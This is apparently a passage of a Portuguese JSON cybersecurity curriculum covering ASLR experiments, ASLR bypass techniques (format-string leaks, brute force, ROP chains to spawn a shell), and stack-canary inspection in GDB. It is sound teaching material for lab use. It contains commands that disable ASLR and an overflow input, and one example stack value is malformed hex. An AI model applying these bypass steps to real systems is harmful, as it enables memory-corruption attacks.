                                    "Documente diferenças em uma tabela comparativa."
                                  ],
                                  "verification": "Endereços variam significativamente (ex: >1MB diferença) em 5 execuções independentes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "hello.c modificado se necessário",
                                    "gcc",
                                    "gdb"
                                  ],
                                  "tips": "Kill todos processos anteriores; use 'setarch -R' só no próximo step para isolar variáveis.",
                                  "learningObjective": "Observar e quantificar os efeitos da randomização de endereços com ASLR.",
                                  "commonMistakes": [
                                    "Não reativar ASLR global",
                                    "Compilar sempre com -no-pie",
                                    "Runs não independentes (sem kill)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar bypass temporário de ASLR e analisar resultados",
                                  "subSteps": [
                                    "Execute com bypass: 'setarch -R ./hello_aslr' e verifique maps via gdb ou /proc.",
                                    "Compare endereços com e sem bypass em múltiplos runs.",
                                    "Reverta ASLR global para 2 e teste persistência do bypass (deve ser por processo).",
                                    "Crie um script bash para automatizar compilações e comparações de maps.",
                                    "Resuma achados: impacto na previsibilidade para exploits."
                                  ],
                                  "verification": "Bypass torna endereços previsíveis novamente, confirmado por maps idênticos em runs com setarch.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "setarch (instalado via apt)",
                                    "Script bash opcional"
                                  ],
                                  "tips": "setarch -R desabilita ASLR só para o processo filho; teste em container Docker para isolamento extra.",
                                  "learningObjective": "Entender limitações e métodos de bypass do ASLR em cenários controlados.",
                                  "commonMistakes": [
                                    "Confundir bypass global com setarch",
                                    "Não comparar quantitativamente",
                                    "Esquecer de restaurar ASLR"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar e documentar impactos da ASLR",
                                  "subSteps": [
                                    "Gere relatórios com screenshots de /proc/maps para casos on/off/bypass.",
                                    "Calcule estatísticas básicas de variação de endereços (média, desvio).",
                                    "Discuta em notas como ASLR frustra ROP/DEP bypasses.",
                                    "Teste em arquitetura x86_64 vs ARM se disponível.",
                                    "Limpe ambiente: restaure ASLR e remova binários."
                                  ],
                                  "verification": "Relatório completo com tabelas, screenshots e conclusões sobre randomização.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramentas de screenshot",
                                    "Editor para relatório Markdown"
                                  ],
                                  "tips": "Use 'pmap <pid>' para resumo rápido; automatize com awk/grep em maps.",
                                  "learningObjective": "Sintetizar experimentos para compreender proteção de memória contra exploits.",
                                  "commonMistakes": [
                                    "Análise qualitativa só (sem números)",
                                    "Não restaurar sistema",
                                    "Ignorar arquiteturas diferentes"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa C que aloca variáveis globais e locais, execute 10x sem ASLR (endereços fixos em 0x400000+), 10x com ASLR (base varia de 0x555... a 0x564...), e 10x com 'setarch -R' (volta a fixos), usando gdb 'disassemble main' para ver offsets randomizados.",
                              "finalVerifications": [
                                "Endereços base variam >1MB entre runs com ASLR on.",
                                "Compilação -no-pie resulta em PIE desabilitado e endereços absolutos fixos.",
                                "setarch -R bypassa ASLR por processo, restaurando previsibilidade.",
                                "Maps em /proc/<pid>/maps mostram randomização em stack/heap/libs.",
                                "Relatório documenta 3 cenários com evidências screenshots.",
                                "Sistema restaurado: ASLR global = 2."
                              ],
                              "assessmentCriteria": [
                                "Precisão na compilação com flags corretas (-no-pie, -pie).",
                                "Observação quantitativa de variações de endereços (múltiplos runs).",
                                "Uso correto de ferramentas (gdb info proc mappings, /proc/<pid>/maps).",
                                "Demonstração efetiva de bypass com setarch -R.",
                                "Análise clara de implicações para segurança (previsibilidade vs randomização).",
                                "Documentação completa e organizada."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Compilação, linking e PIE.",
                                "Sistemas Operacionais: Gerenciamento de memória virtual e /proc filesystem.",
                                "Redes e Segurança: Mitigações contra exploits (ROP, buffer overflows).",
                                "Análise de Dados: Estatísticas de variação de endereços.",
                                "Automação de Scripts: Bash para testes repetíveis."
                              ],
                              "realWorldApplication": "ASLR é essencial em servidores Linux contra ataques de injeção de código, como vistos no EternalBlue (WannaCry), onde previsibilidade de endereços facilitava ROP chains; pentesters usam bypasses como setarch para validar vulnerabilidades em pentests."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.4.3",
                        "name": "Limitações, Bypass e Integração com Outras Proteções",
                        "description": "Análise das fraquezas do ASLR, técnicas de bypass e combinação com proteções como canários e ROP mitigações.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.3.1",
                            "name": "Identificar limitações do ASLR",
                            "description": "Discutir vazamentos de informação (info leaks) via format strings ou side-channels que permitem adivinhar offsets, e limitações em ASLR parcial.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos do ASLR e suas limitações conceituais",
                                  "subSteps": [
                                    "Explicar o que é ASLR (Address Space Layout Randomization) e seu objetivo de randomizar endereços de memória para dificultar exploits.",
                                    "Identificar limitações gerais, como ASLR parcial que não randomiza todos os segmentos de memória (ex: heap, stack, bibliotecas).",
                                    "Analisar como offsets relativos podem permanecer previsíveis mesmo com randomização.",
                                    "Estudar o impacto de implementações incompletas em diferentes SOs (Linux, Windows).",
                                    "Comparar ASLR completo vs. parcial com exemplos visuais de mapas de memória."
                                  ],
                                  "verification": "Criar um diagrama comparativo de layout de memória com e sem ASLR parcial, destacando offsets fixos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação oficial do kernel Linux sobre ASLR",
                                    "Ferramenta gdb para inspecionar mapas de memória",
                                    "Artigos sobre níveis de ASLR (0-3 no Linux)"
                                  ],
                                  "tips": "Use comandos como 'cat /proc/<pid>/maps' para visualizar randomização em processos reais.",
                                  "learningObjective": "Dominar os conceitos básicos de ASLR e reconhecer quando a randomização é incompleta.",
                                  "commonMistakes": [
                                    "Confundir ASLR com NX/DEP",
                                    "Ignorar que bibliotecas compartilhadas podem ter ASLR parcial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar vazamentos de informação via format strings",
                                  "subSteps": [
                                    "Entender format strings em funções como printf() e como elas podem vazar conteúdo da stack.",
                                    "Simular um info leak com código vulnerável usando %p ou %s para imprimir endereços.",
                                    "Analisar como leaks revelam bases de bibliotecas ou stack canaries, permitindo calcular offsets.",
                                    "Praticar com um programa C vulnerável para extrair endereços randomizados pelo ASLR.",
                                    "Discutir mitigações como FORTIFY_SOURCE e como contorná-las em cenários reais."
                                  ],
                                  "verification": "Desenvolver e executar um exploit simples que leake um endereço de libc via format string.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Compilador GCC",
                                    "Exemplos de código C vulneráveis a format string",
                                    "GDB ou pwndbg para debugging"
                                  ],
                                  "tips": "Compile sem proteções (-fno-stack-protector -z execstack) para testes iniciais.",
                                  "learningObjective": "Identificar e demonstrar como format strings bypassam ASLR via info leaks.",
                                  "commonMistakes": [
                                    "Esquecer de alinhar o stack pointer",
                                    "Não considerar ASLR em bibliotecas dinâmicas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar side-channels para adivinhação de offsets",
                                  "subSteps": [
                                    "Definir side-channels como canais indiretos de informação (timing, cache, branch prediction).",
                                    "Estudar ataques como Flush+Reload para inferir endereços via cache state.",
                                    "Explorar como side-channels combinados com leaks parciais adivinhham offsets ASLR.",
                                    "Simular um ataque de timing em código assembly para medir acessos de memória.",
                                    "Revisar casos reais como Spectre/Meltdown que exploram side-channels em contextos ASLR."
                                  ],
                                  "verification": "Implementar um script simples de timing attack para detectar presença de dados em cache.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Linguagem Python com bibliotecas timeit",
                                    "Documentos sobre Flush+Reload",
                                    "Ferramentas como perf para análise de cache"
                                  ],
                                  "tips": "Execute em máquina virtual para isolar ruído de cache do sistema host.",
                                  "learningObjective": "Compreender como side-channels permitem bypass não-intrusivo do ASLR.",
                                  "commonMistakes": [
                                    "Subestimar ruído ambiental em medições de timing",
                                    "Confundir side-channels com leaks diretos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar limitações do ASLR com outras proteções e estratégias de bypass",
                                  "subSteps": [
                                    "Discutir como ASLR falha quando combinado com ROP sem leak (offsets fixos relativos).",
                                    "Analisar bypasses em ASLR parcial, como em binários estáticos ou kernels antigos.",
                                    "Explorar integrações com PIE, RELRO e CFI para mitigar leaks.",
                                    "Revisar exploits famosos (ex: House of Force com leaks ASLR).",
                                    "Planejar defesas: habilitar ASLR full + leaks prevention."
                                  ],
                                  "verification": "Escrever um relatório resumindo 3 cenários de bypass ASLR e suas mitigações.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exploit-DB para casos reais",
                                    "Livro 'Hacking: The Art of Exploitation'",
                                    "Ferramenta checksec para análise de binários"
                                  ],
                                  "tips": "Use checksec.sh para verificar níveis de ASLR em binários ELF.",
                                  "learningObjective": "Sintetizar limitações do ASLR em contextos de proteção em camadas.",
                                  "commonMistakes": [
                                    "Ignorar evoluções como KASLR",
                                    "Focar só em userland, esquecendo kernel"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vulnerável com buffer overflow e format string bug, um atacante usa printf(user_input) para leakar o endereço base da libc (randomizado pelo ASLR). Com o offset conhecido da GOT, calcula o endereço exato de system() para ROP chain, bypassando ASLR parcial onde stack é randomizada mas libc não fully.",
                              "finalVerifications": [
                                "Explicar 3 limitações específicas do ASLR com exemplos.",
                                "Demonstrar um leak via format string em código real.",
                                "Identificar side-channels em um cenário dado.",
                                "Comparar ASLR parcial vs. full em um binário.",
                                "Propor mitigações para um exploit descrito."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de info leaks e side-channels (80%+ acerto).",
                                "Capacidade de simular bypass em ambiente controlado.",
                                "Profundidade na análise de ASLR parcial (citações de SOs específicos).",
                                "Clareza em diagramas e relatórios explicativos.",
                                "Integração correta com outras proteções de memória."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender stack e format strings.",
                                "Criptografia: Analogia com entropia em chaves randômicas.",
                                "Análise de Desempenho: Timing e cache em algoritmos.",
                                "Ética em Cibersegurança: Responsabilidade em disclosure de vulnerabilidades."
                              ],
                              "realWorldApplication": "Em pentests, identificar ASLR parcial em serviços web permite planejar exploits como return-to-libc; em desenvolvimento, habilitar full ASLR + W^X mitiga ataques como EternalBlue que exploraram leaks em SMB."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.2.2"
                            ]
                          },
                          {
                            "id": "10.1.1.4.3.2",
                            "name": "Explorar técnicas de bypass de ASLR",
                            "description": "Demonstrar bypass via leaks de ASLR (ex: printf leaks), brute force em ASLR parcial, ou uso de ROP chains relativos, com exemplos em CTFs ou labs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender ASLR e Configurar Ambiente de Teste",
                                  "subSteps": [
                                    "Estude o funcionamento do ASLR: randomização de base de bibliotecas, heap, stack e mmap.",
                                    "Compile um binário vulnerável a buffer overflow com ASLR ativado (use gcc -fno-stack-protector -z execstack).",
                                    "Verifique status do ASLR com cat /proc/sys/kernel/randomize_va_space (deve ser 2 para full ASLR).",
                                    "Instale ferramentas: GDB, pwndbg, checksec para análise de proteções.",
                                    "Execute o binário múltiplas vezes e observe endereços variando com ldd ou gdb info proc mappings."
                                  ],
                                  "verification": "Confirme variação de endereços em execuções sucessivas e relatório de checksec mostrando ASLR ativado.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Linux VM (Ubuntu), GCC compiler, GDB with pwndbg, checksec script"
                                  ],
                                  "tips": "Use ASLR parcial (echo 1 > /proc/sys/kernel/randomize_va_space) inicialmente para simplificar testes.",
                                  "learningObjective": "Compreender limitações do ASLR e preparar ambiente para bypass.",
                                  "commonMistakes": [
                                    "Esquecer de desativar NX ou Canary temporariamente para foco em ASLR",
                                    "Não reiniciar processos para nova randomização"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Bypass via Information Leaks (ex: printf)",
                                  "subSteps": [
                                    "Crie uma vulnerabilidade de format string (printf(user_input)) em um binário ASLR.",
                                    "Use %p ou %s para leak de endereços da stack ou libc base via gdb ou netcat.",
                                    "Extraia offset do leak para calcular base da libc (use one_gadget ou ROPgadget).",
                                    "Automatize leak com pwntools em Python: envie payload e parse resposta.",
                                    "Teste execução de system('/bin/sh') usando endereço leakado."
                                  ],
                                  "verification": "Obtenha shell interativa calculando corretamente a base leakada e executando ROP.",
                                  "estimatedTime": "2-3 hours",
                                  "materials": [
                                    "Pwntools Python library",
                                    "ROPgadget tool",
                                    "Vulnerable binary source code"
                                  ],
                                  "tips": "Comece com leaks simples de stack pointers antes de libc; use gef/pwndbg para visualização.",
                                  "learningObjective": "Dominar extração de informações para derrotar randomização de endereços.",
                                  "commonMistakes": [
                                    "Payloads muito longos causando crash antes do leak",
                                    "Ignorar endianness em parses de endereços"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Brute Force em ASLR Parcial",
                                  "subSteps": [
                                    "Configure ASLR parcial (randomize_va_space=1) para entropia baixa em stack.",
                                    "Desenvolva script para brute force de endereços (ex: 16 bits de entropia, ~65k tentativas).",
                                    "Use fork() ou multiprocessing em Python para paralelizar tentativas rápidas.",
                                    "Integre com buffer overflow payload que verifica sucesso (ex: read primitive).",
                                    "Meça taxa de sucesso e tempo médio em múltiplas rodadas."
                                  ],
                                  "verification": "Script obtém shell em <1 minuto consistentemente em ASLR parcial.",
                                  "estimatedTime": "1.5-2.5 hours",
                                  "materials": [
                                    "Python com multiprocessing",
                                    "Netcat ou socat para listener"
                                  ],
                                  "tips": "Otimize com payloads que não crasham em falhas, usando loops de retry.",
                                  "learningObjective": "Aplicar brute force viável contra ASLR com entropia reduzida.",
                                  "commonMistakes": [
                                    "Timeouts longos por tentativa lenta",
                                    "Não contabilizar overhead de fork"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir ROP Chains Relativos para Bypass Robusto",
                                  "subSteps": [
                                    "Gere ROP chain relativa usando ret2plt ou gadgets sem dependência absoluta.",
                                    "Combine leak inicial com ROP para desabilitar ASLR ou escalar privilégios.",
                                    "Teste em lab CTF (ex: protostar, ROP Emporium) com full ASLR.",
                                    "Integre múltiplas técnicas: leak + brute force fallback.",
                                    "Documente chain em pwntools exploit completo."
                                  ],
                                  "verification": "Exploit funcional em binário com full ASLR + outras proteções parciais.",
                                  "estimatedTime": "2-4 hours",
                                  "materials": [
                                    "ROP Emporium labs",
                                    "Pwntools, ROPgadget, Cyclic pattern generator (pattern_create.rb)"
                                  ],
                                  "tips": "Priorize gadgets relativos como pop rdi; ret para argumentos limpos.",
                                  "learningObjective": "Criar chains independentes de ASLR para ataques realistas.",
                                  "commonMistakes": [
                                    "Dependência de endereços absolutos em gadgets",
                                    "Overflow incorreto em chain longa"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um CTF como PicoCTF 'ROP Chain' ou lab ROP Emporium 'ret2syscall': use printf leak para base libc, calcule system offset, construa ROP para execve('/bin/sh', NULL, NULL), brute force stack offset se necessário, obtendo shell root.",
                              "finalVerifications": [
                                "Leak bem-sucedido de pelo menos um endereço ASLR-randomizado.",
                                "Exploit via brute force roda em <5 minutos em ASLR parcial.",
                                "ROP chain relativa executa sem conhecimento prévio de bases.",
                                "Relatório com screenshots de gdb mostrando bypass.",
                                "Exploit funciona em pelo menos 3 binários diferentes.",
                                "Integração com outras proteções (ex: bypass Canary via leak)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de limitações ASLR (entropia por componente).",
                                "Eficiência do exploit (tempo, taxa sucesso >90%).",
                                "Qualidade do código (pwntools limpo, comentado).",
                                "Análise de erros comuns e mitigações demonstradas.",
                                "Criatividade em combinações de técnicas (leak+ROP+brute).",
                                "Documentação completa com diagramas de memória."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Gadgets ROP e análise binária.",
                                "Sistemas Operacionais: Gerenciamento de memória virtual e /proc.",
                                "Criptoanálise: Entropia e ataques side-channel.",
                                "Redes: Automação de exploits via sockets/netcat.",
                                "Ética em Cibersegurança: Discussão de impactos em produção."
                              ],
                              "realWorldApplication": "Pentesters usam bypass ASLR em assessments para demonstrar RCE em serviços web (ex: Apache com buffer overflow), pesquisadores exploram em zero-days (browser exploits), e DFIR analisa logs de leaks para detecção de ataques em produção."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.2.3"
                            ]
                          },
                          {
                            "id": "10.1.1.4.3.3",
                            "name": "Integrar ASLR com outras proteções de memória",
                            "description": "Explicar sinergia com stack canaries, NX bit, RELRO e CFI (Control Flow Integrity), referenciando programação orientada a retornos e análise estática.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar fundamentos do ASLR e suas limitações principais",
                                  "subSteps": [
                                    "Estude o funcionamento do ASLR (Address Space Layout Randomization) em sistemas Linux/Windows.",
                                    "Identifique limitações como vazamentos de informação (info leaks) via ROP (Return-Oriented Programming).",
                                    "Analise exemplos de bypass de ASLR usando ferramentas como gdb e objdump.",
                                    "Documente cenários onde ASLR sozinho falha contra ataques sofisticados.",
                                    "Compare ASLR parcial vs. full ASLR."
                                  ],
                                  "verification": "Criar um diagrama explicando um bypass de ASLR via info leak e salvá-lo em um arquivo PDF.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial do kernel Linux sobre ASLR",
                                    "Ferramentas: gdb, objdump",
                                    "Exemplos de código C vulnerável"
                                  ],
                                  "tips": "Use 'cat /proc/sys/kernel/randomize_va_space' para verificar status do ASLR no Linux.",
                                  "learningObjective": "Compreender por que ASLR precisa de proteções complementares.",
                                  "commonMistakes": [
                                    "Confundir ASLR com DEP/NX",
                                    "Ignorar ASLR parcial em bibliotecas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar proteções complementares: Stack Canaries, NX Bit, RELRO e CFI",
                                  "subSteps": [
                                    "Explique stack canaries: compilação com -fstack-protector e como detectam overflows.",
                                    "Descreva NX bit (No-eXecute): configuração via PaX/EXECSHIELD e prevenção de shellcode.",
                                    "Analise RELRO (RELocation Read-Only): full vs partial, usando -Wl,-z,relro,-z,now.",
                                    "Estude CFI (Control Flow Integrity): implementações como LLVM CFI e prevenção de ROP/JOP.",
                                    "Compile exemplos simples ativando cada proteção com GCC/Clang."
                                  ],
                                  "verification": "Compilar 4 binários, cada um com uma proteção ativada, e verificar com 'readelf -d' e 'checksec.sh'.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GCC/Clang man pages",
                                    "Script checksec.sh",
                                    "Exemplos de código C"
                                  ],
                                  "tips": "Use 'gcc -fstack-protector-all -z relro -pie' para ativar múltiplas proteções.",
                                  "learningObjective": "Dominar mecanismos individuais e flags de compilação.",
                                  "commonMistakes": [
                                    "Confundir RELRO partial com full",
                                    "Esquecer de ativar PIE para ASLR full"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar sinergias entre ASLR e proteções complementares",
                                  "subSteps": [
                                    "Explique como stack canaries previnem ROP chains que leakam endereços ASLR.",
                                    "Descreva como NX + ASLR bloqueia shellcode e força ROP (mas canaries mitigam).",
                                    "Analise RELRO impedindo reescrita de GOT/PLT para bypass ASLR.",
                                    "Discuta CFI validando fluxos de controle apesar de ASLR randomizado.",
                                    "Crie um mapa mental das interações."
                                  ],
                                  "verification": "Escrever um relatório de 1 página descrevendo 3 sinergias específicas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Artigos sobre ROPgadget e exploits reais (ex: Heartbleed)",
                                    "Ferramenta ROPgadget"
                                  ],
                                  "tips": "Pense em ataques em camadas: ASLR primeiro, depois mitigações para o bypass.",
                                  "learningObjective": "Identificar como proteções criam defesa em profundidade.",
                                  "commonMistakes": [
                                    "Subestimar info leaks em cenários com múltiplas proteções",
                                    "Ignorar CFI em contextos modernos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar, testar e analisar estaticamente a integração",
                                  "subSteps": [
                                    "Compile um binário vulnerável com todas as proteções: ASLR + canaries + NX + RELRO + CFI.",
                                    "Tente exploits (buffer overflow, ROP) usando gdb e pwndbg.",
                                    "Realize análise estática com ferramentas como Ghidra ou radare2.",
                                    "Compare sucesso de exploits com/sem proteções.",
                                    "Documente lições aprendidas."
                                  ],
                                  "verification": "Gravar um vídeo de 5 min demonstrando falha de exploit com proteções ativas.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "GCC/Clang com flags completas",
                                    "Gdb/pwndbg",
                                    "Ghidra ou radare2",
                                    "Docker para ambiente isolado"
                                  ],
                                  "tips": "Use 'setarch -R' para desabilitar ASLR durante testes iniciais.",
                                  "learningObjective": "Aplicar conhecimentos em prática e validar integrações.",
                                  "commonMistakes": [
                                    "Não isolar ambiente (use VM/Docker)",
                                    "Esquecer flags como -D_FORTIFY_SOURCE=2"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um programa C com buffer overflow intencional. Compile sem proteções (vulnerável a ROP leak ASLR). Recompile com ASLR+canaries+NX+RELRO+CFI (-fstack-protector-strong -z relro -z now -pie -D_FORTIFY_SOURCE=2). Use ROPgadget para gerar chains; observe falhas sequenciais nas proteções.",
                              "finalVerifications": [
                                "Explicar verbalmente 4 sinergias específicas (ASLR+canary, ASLR+NX, etc.).",
                                "Demonstrar compilação de binário fully protegido e verificação com checksec.sh (100% mitigações).",
                                "Analisar estaticamente um binário com Ghidra, identificando proteções ativas.",
                                "Tentar e falhar em um bypass ROP em ambiente protegido.",
                                "Criar diagrama de defesa em profundidade.",
                                "Discutir limitações restantes (ex: side-channels)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na explicação de sinergias (80% cobertura dos 4 mecanismos).",
                                "Corretude na compilação e verificação de proteções (checksec 100%).",
                                "Profundidade na análise de bypasses falhados.",
                                "Qualidade do diagrama/relatório (clareza e completude).",
                                "Demonstração prática funcional sem erros.",
                                "Integração de análise estática com referências a ROP."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly (compilação e exploits).",
                                "Arquitetura de Computadores (endereçamento de memória).",
                                "Análise de Malware e Reverse Engineering.",
                                "Desenvolvimento Seguro de Software (secure coding).",
                                "Redes e Sistemas Operacionais (hardening Linux)."
                              ],
                              "realWorldApplication": "Em hardening de servidores empresariais (ex: Apache/Nginx com proteções ativadas), desenvolvimento de firmware seguro (IoT) ou análise de vulnerabilidades em CTFs/pentests profissionais, prevenindo exploits como EternalBlue ou ROP em binários reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.1.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.5",
                    "name": "Proteção de Memória com Canários",
                    "description": "Uso de valores sentinela na pilha para detectar sobrescrita de buffers.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.5.1",
                        "name": "Valores Canários na Pilha",
                        "description": "Conceito fundamental dos valores sentinela (canários) inseridos na pilha de execução para proteger contra sobrescrita de buffers, posicionados entre o buffer local e o quadro de pilha de retorno.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.1.1",
                            "name": "Identificar a estrutura da pilha com canário",
                            "description": "Analisar a representação da pilha em funções C/C++ compiladas com proteção de canário, reconhecendo a posição exata do valor sentinela entre variáveis locais e o endereço de retorno.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e compilar código C com proteção de canário ativada",
                                  "subSteps": [
                                    "Instale ou verifique a presença do GCC e GDB no sistema (ex: sudo apt install gcc gdb).",
                                    "Crie um arquivo vuln.c com uma função contendo variáveis locais e uma chamada vulnerável como strcpy em um buffer pequeno.",
                                    "Compile o código com as flags: gcc -fstack-protector-all -g -O0 -o vuln vuln.c, garantindo símbolos de debug e sem otimizações.",
                                    "Verifique a proteção com a ferramenta checksec ./vuln ou objdump -h ./vuln | grep stack."
                                  ],
                                  "verification": "Execute 'checksec ./vuln' e confirme que 'Stack Canary: ✓ Enabled'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC >= 4.1",
                                    "GDB",
                                    "Editor de texto (ex: vim ou VS Code)",
                                    "checksec (instalar via git clone https://github.com/slimm609/checksec.sh)"
                                  ],
                                  "tips": "Sempre use -O0 para preservar a estrutura da pilha; teste em ambiente Linux x86-64 para consistência.",
                                  "learningObjective": "Preparar um binário executável com proteção de canário ativa para análise posterior.",
                                  "commonMistakes": [
                                    "Omitir -fstack-protector-all, resultando em ausência de canário; usar -O2 que otimiza e remove variáveis desnecessárias."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar o programa no GDB e inspecionar a pilha inicial",
                                  "subSteps": [
                                    "Inicie o GDB: gdb ./vuln.",
                                    "Defina breakpoint na função principal: break main.",
                                    "Execute o programa: run.",
                                    "Após pausar, visualize o registrador de pilha: info registers rsp.",
                                    "Dump da memória da pilha: x/30gx $rsp (para 30 words em hex, 64-bit)."
                                  ],
                                  "verification": "A pilha mostra valores iniciais das variáveis locais no topo (menores endereços) e área não inicializada abaixo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binário vuln compilado",
                                    "GDB"
                                  ],
                                  "tips": "Use 'layout asm' no GDB para ver assembly e pilha lado a lado; foque em $rsp atual.",
                                  "learningObjective": "Visualizar a representação bruta da pilha em runtime e identificar a direção de crescimento (baixo para cima).",
                                  "commonMistakes": [
                                    "Confundir $rsp com $rbp; não usar 'x/30gx' que mostra 64-bit corretamente, levando a dumps ilegíveis."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar a posição exata do valor canário na estrutura da pilha",
                                  "subSteps": [
                                    "Continue a execução até após a alocação de variáveis locais: next ou step.",
                                    "Dump novamente a pilha: x/30gx $rsp e anote endereços.",
                                    "Compare com o canário do thread: x/gx $fs:0x28 (em x86-64 Linux) para ver o valor original.",
                                    "Mapeie: variáveis locais (previsíveis/padrão), valor aleatório 8 bytes (canário), saved rbp (aponta para pilha pai), return address (endereço em .text).",
                                    "Desenhe um diagrama da pilha anotando offsets relativos."
                                  ],
                                  "verification": "O valor no dump da pilha entre locals e ret addr corresponde exatamente a $fs:0x28 e é não-zero/random.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB aberto no programa",
                                    "Papel/caneta para diagrama"
                                  ],
                                  "tips": "O canário tipicamente termina com byte 0x00 para detecção fácil; use 'disas' para confirmar return addr.",
                                  "learningObjective": "Reconhecer a sequência: [locals] | [canário] | [saved RBP] | [ret addr] na pilha protegida.",
                                  "commonMistakes": [
                                    "Confundir canário com saved RBP (verifique se aponta para código); ignorar endianness em dumps hex."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar o funcionamento do canário com simulação de overflow",
                                  "subSteps": [
                                    "Modifique o código para strcpy com input longo (ex: passe argv[1] grande via run $(python -c 'print(\"A\"*50)') ).",
                                    "Recompile e rode no GDB: observe crash após overflow.",
                                    "Examine $rsp pós-overflow: x/30gx $rsp para ver canário sobrescrito.",
                                    "Confirme mensagem: '*** stack smashing detected *** terminated' e ABRT.",
                                    "Compare pré e pós-overflow para validar proteção."
                                  ],
                                  "verification": "O programa aborta especificamente por canário corrompido, não por segfault direto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Código modificado",
                                    "GDB",
                                    "Python para payload"
                                  ],
                                  "tips": "Rode sem ASLR (echo 0 | sudo tee /proc/sys/kernel/randomize_va_space) para endereços consistentes.",
                                  "learningObjective": "Compreender o mecanismo de detecção do canário em ataques de overflow de buffer.",
                                  "commonMistakes": [
                                    "Input curto que não atinge canário; esquecer de recompilar após modificações."
                                  ]
                                }
                              ],
                              "practicalExample": "Código vuln.c: #include <string.h> void func() { char buf[16]; strcpy(buf, \"input\"); } int main(int argc, char** argv) { func(); return 0; }. Compile: gcc -fstack-protector-all -g -O0 -o vuln vuln.c. No GDB: break func, run. Após strcpy pequena: x/20gx $rsp mostra ~0x7fffffffdbb0: 0x00000000696e7074 ('tpin.'), buf invertido; 0x7fffffffdbb8: 0x2b8c7a1e2f4d3g5f (canário ex.); 0x7fffffffdbb0+24: saved rbp; +32: ret addr 0x55555555492d. Overflow com 'A'*50 sobresscreve canário, crash.",
                              "finalVerifications": [
                                "Diagrama da pilha desenhado corretamente com posições de locals, canário, saved RBP e ret addr.",
                                "Valor do canário obtido de $fs:0x28 corresponde ao na pilha.",
                                "Simulação de overflow resulta em detecção específica de 'stack smashing'.",
                                "Explicação verbal da posição: canário entre locals e ret addr para bloquear overflows.",
                                "Identificação consistente em múltiplas execuções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização do canário (offset correto relativo a $rsp).",
                                "Correta interpretação do dump de memória (diferenciação de elementos).",
                                "Diagrama claro e rotulado da estrutura da pilha.",
                                "Explicação do propósito de proteção contra ROP/buffer overflow.",
                                "Sucesso na simulação de overflow com detecção ativada.",
                                "Uso correto de comandos GDB sem erros."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: gerenciamento de memória e buffers.",
                                "Arquitetura de Computadores: estrutura da pilha e registradores x86-64.",
                                "Engenharia Reversa: análise de binários e debuggers.",
